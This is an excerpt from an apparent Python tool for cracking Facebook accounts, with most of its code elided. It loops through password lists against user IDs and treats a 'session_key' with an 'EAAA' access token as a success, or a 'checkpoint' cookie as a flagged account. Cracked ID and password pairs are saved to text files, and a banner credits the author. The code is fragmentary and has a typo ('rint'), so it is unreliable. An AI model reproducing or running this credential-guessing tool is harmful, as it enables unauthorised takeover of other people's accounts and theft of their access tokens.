	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				open('/sdcard/Laiba-CP.txt','a').write('%s\n' % wrt)
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				rint( f'\r\x1b[1;92m [Successful-Laiba] {idf} * {pw}')
				...
				print(f'\r\x1b[1;92m [Successful-Laiba] {idf} * {pw}')

				wrt =('%s - %s' % (idf,pw))

				ok.append(wrt)

				open('/sdcard/Successful-Laiba.txt','a').write('%s\n' % wrt)
...
\33[1;32m𝔸𝕦𝕥𝕙𝕠𝕣   :\33[1;32m Laiba khan

\33[1;32m𝔽𝕒𝕔𝕖𝕓𝕠𝕠𝕜 : Abdul Nasir     

\33[1;32m𝔾𝕚𝕥𝕙𝕦𝕓   : Laiba 
...
class Main:
	...
	def __init__(self):
		...
		print("\033[1;37mNote : \33[1;41m\33[1;37mApprove korte first follow my fb account\33[0m")
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		sys.stdout.write(
			...
			"\r [+]%s> /[Laiba]>%s -> [OK]:-%s - [CP]:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[1;32m[Successful-Laiba]%s | %s\033[1;32m         "%(uid, pw))

				print ("\r \033[1;32m Congrats ")

				self.ok.append("%s|%s"%(uid, pw))

				open("Successful-Laiba.txt","a").write(" %s|%s\n"%(uid, pw))
...
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[1;32m[Successful-Laiba] %s | %s\033[0;32m         "%(uid, pw))
